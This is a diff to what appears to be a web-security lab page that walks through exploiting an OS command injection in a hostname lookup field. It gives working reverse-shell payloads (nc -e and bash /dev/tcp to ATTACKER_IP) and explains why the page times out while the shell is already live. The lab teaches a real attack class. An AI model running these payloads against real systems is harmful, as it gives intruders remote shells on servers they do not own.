@@ -40,17 +40,33 @@
 <ol>
   <li>Start a listener on your own machine:
       <code>nc -lvnp 4444</code></li>
-  <li>Submit this as the hostname (the trailing <code>&amp;</code> backgrounds the reverse
-      shell so the request itself returns immediately, instead of hanging until this
-      route's 10-second timeout kills it):
+  <li>Submit this as the hostname. The trailing <code>&amp;</code> backgrounds the reverse
+      shell inside the injected command — but don't expect the page to return right away:
+      this route reads the child process's stdout/stderr with
+      <code>capture_output=True</code>, which only unblocks once those pipes see EOF, and a
+      backgrounded <code>nc</code> that's still connected to your listener keeps holding
+      those same pipes open. So the request hangs for the full 10 seconds and then shows
+      "(lookup timed out)" — that message is <em>not</em> a failure signal. Your listener
+      will already have caught the shell well before the timeout fires; the HTTP response
+      is just idling on pipes the backgrounded process refuses to close, disconnected from
+      whether the exploit worked:
       <br>
       <code>localhost; nc -e /bin/sh ATTACKER_IP 4444 &amp;</code></li>
   <li>Your listener now has an interactive shell on the target. If the target doesn't have
       <code>nc -e</code> compiled in, bash's own <code>/dev/tcp</code> feature works
-      identically with no extra tools required:
+      identically with no extra tools required — and hits the same pipe-holding behavior,
+      so again expect "(lookup timed out)" on the page while the shell is already live in
+      your listener:
       <br>
       <code>localhost; bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' &amp;</code></li>
 </ol>
+<p>
+  This is a good approximation of what real blind command injection feels like: there's
+  often no clean confirmation in the HTTP response either way, timeouts and generic error
+  pages are common, and the only reliable evidence is out-of-band — your listener catching
+  a connection, a DNS query hitting a domain you control, and so on. Judge success by what
+  arrives at your listener, not by what the vulnerable page shows you.
+</p>
 <p>
   OS command injection is consistently rated among the most severe web vulnerabilities
   because a successful exploit doesn't just leak data — it hands the attacker arbitrary
